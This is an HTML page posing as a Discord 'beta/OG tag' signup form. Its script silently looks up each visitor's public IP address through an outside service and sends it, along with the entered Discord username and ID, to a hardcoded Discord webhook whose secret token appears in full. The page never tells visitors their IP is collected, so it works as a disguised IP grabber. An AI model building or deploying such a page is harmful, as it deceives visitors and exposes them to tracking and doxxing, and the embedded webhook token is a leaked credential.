<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Submit Discord Username and ID</title>
    <style>
        /* Reset and Base Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background-color: #0d0d0d;
            color: #e0e0ff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 800px;
            background-color: #1a1a2e;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.7);
            color: #e0e0ff;
            text-align: center;
        }
        
        h1 {
            color: #4da6ff;
            font-size: 36px;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 18px;
            color: #ccc;
            margin-bottom: 25px;
            font-style: italic;
        }

        input {
            padding: 10px;
            font-size: 16px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
            width: 100%;
            box-sizing: border-box;
            background-color: #333;
            color: #e0e0ff;
        }
        
        .btn {
            display: block;
            width: 250px;
            padding: 15px;
            margin: 15px auto;
            background: linear-gradient(135deg, #333, #1a1a2e);
            color: #4da6ff;
            font-size: 18px;
            border-radius: 8px;
            border: 2px solid #4da6ff;
            text-align: center;
            text-decoration: none;
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .btn:hover {
            background: #4da6ff;
            color: #fff;
        }

        #backButton {
            background: linear-gradient(135deg, #333, #1a1a2e); /* Dark gradient */
            color: #ff4da6; /* Pink color */
            border: 2px solid #ff4da6; /* Pink border */
            font-size: 18px;
            border-radius: 8px;
            padding: 15px;
            width: 250px;
            margin: 10px auto;
            text-align: center;
            text-decoration: none;
            display: block;
            transition: all 0.3s ease;
        }

        #backButton:hover {
            background: #ff4da6; /* Pink on hover */
            color: #fff; /* White text */
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Fill info for early beta/og tag when websites fully out</h1>
        <p class="subtitle">Enter your Discord username and ID to submit ticket.</p>

        <div>
            <label for="discord-username">Enter Discord Username: </label>
            <input type="text" id="discord-username" placeholder="Discord Username" />
        </div>
        <div>
            <label for="discord-id">Enter Discord ID: </label>
            <input type="text" id="discord-id" placeholder="Discord ID" />
        </div>

        <button class="btn" onclick="submitDiscordData()">Submit</button>

        <!-- Back Button -->
        <a href="file:///C:/Users/xznap/xzna.html" id="backButton">Back</a>
    </div>

    <script>
        // Fetch IP address of the user
        async function getIpAddress() {
            try {
                const ipResponse = await fetch("https://api.ipify.org?format=json");
                const ipData = await ipResponse.json();
                return ipData.ip;  // Return the IP address
            } catch (error) {
                console.error("Error fetching IP address:", error);
                alert("Error fetching IP address. Please try again later.");
                return null;
            }
        }

        // Handle form submission
        async function submitDiscordData() {
            const username = document.getElementById("discord-username").value;
            const discordId = document.getElementById("discord-id").value;

            // Validate input fields
            if (!username || !discordId) {
                alert("Please enter both your Discord username and ID.");
                return;
            }

            // Get the IP address
            const ipAddress = await getIpAddress();
            if (!ipAddress) {
                return;  // If IP address fetch fails, stop the submission
            }

            // Webhook URL (replace with your own if needed)
            const webhookUrl = "https://discord.com/api/webhooks/1308602481177133127/aqpQnfXcB8QrS00NlXoVK_qsEHgsOq1G2EKL0w7nnMDS228j8J4tdQyojGHtVy7AKc9W";
            
            // Payload with Discord Username, ID, and IP Address as an Embed
            const payload = {
                "embeds": [
                    {
                        "title": "New Discord Info Submission",
                        "color": 5814783,  // Color for the embed (can be customized)
                        "fields": [
                            {
                                "name": "Discord Username",
                                "value": username,
                                "inline": true
                            },
                            {
                                "name": "Discord ID",
                                "value": discordId,
                                "inline": true
                            },
                            {
                                "name": "IP Address",
                                "value": ipAddress,
                                "inline": false
                            }
                        ],
                        "footer": {
                            "text": "Beta/OG Tag Submission",
                            "icon_url": "https://example.com/footer-icon.png"  // Optional footer icon
                        },
                        "timestamp": new Date().toISOString()  // Timestamp of the submission
                    }
                ]
            };

            // Sending the data to the Discord webhook
            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => {
                alert("Discord info submitted successfully!");
            })
            .catch(error => {
                console.error("sent", error);
                alert("sent");
            });
        }
    </script>

</body>
</html>
